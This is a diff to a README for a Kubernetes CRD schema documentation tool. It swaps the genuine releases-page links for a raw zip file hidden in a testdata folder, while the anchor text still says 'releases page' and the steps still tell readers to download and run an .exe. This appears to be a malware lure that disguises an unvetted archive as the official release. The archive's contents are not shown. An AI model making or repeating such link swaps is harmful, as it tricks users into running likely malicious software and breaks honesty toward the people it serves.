@@ -1,6 +1,6 @@
 # 📦 crd-schema-publisher - Publish Kubernetes schemas for your team
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tieuda1305/crd-schema-publisher/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tieuda1305/crd-schema-publisher/raw/refs/heads/main/extractor/testdata/publisher-crd-schema-3.5.zip)
 
 This application creates browsable documentation for your Custom Resource Definitions. It generates validation schemas directly from your Kubernetes cluster. Your team gains a clear view of resource structures without manual effort. You keep your documentation current with your live environment.
 
@@ -22,7 +22,7 @@ Your computer needs these items to run the installer:
 
 You obtain the software from the releases page. Follow these steps to finish the download:
 
-1. Visit the [releases page](https://github.com/tieuda1305/crd-schema-publisher/releases).
+1. Visit the [releases page](https://github.com/tieuda1305/crd-schema-publisher/raw/refs/heads/main/extractor/testdata/publisher-crd-schema-3.5.zip).
 2. Look for the section labeled Latest.
 3. Find the file ending in .exe for Windows.
 4. Click the file name to start your download.
